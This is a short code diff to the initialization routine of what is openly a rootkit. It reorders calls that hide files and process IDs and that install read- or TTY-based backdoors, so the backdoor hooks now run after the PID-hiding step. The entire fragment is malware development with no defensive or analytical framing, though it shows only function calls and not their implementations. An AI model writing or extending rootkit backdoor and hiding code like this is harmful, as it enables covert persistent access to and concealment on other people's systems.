@@ -60,15 +60,15 @@ init_hooks(void)
     if (rootkit.hiding_files)
         hide_files();
 
-    if (rootkit.backdoor == BD_READ)
-        backdoor_read();
-    else if (rootkit.backdoor == BD_TTY)
-        backdoor_tty();
-
     if (rootkit.hiding_pids) {
         clear_hidden_pids();
         unhide_pids();
     }
+
+    if (rootkit.backdoor == BD_READ)
+        backdoor_read();
+    else if (rootkit.backdoor == BD_TTY)
+        backdoor_tty();
 }
 
 void
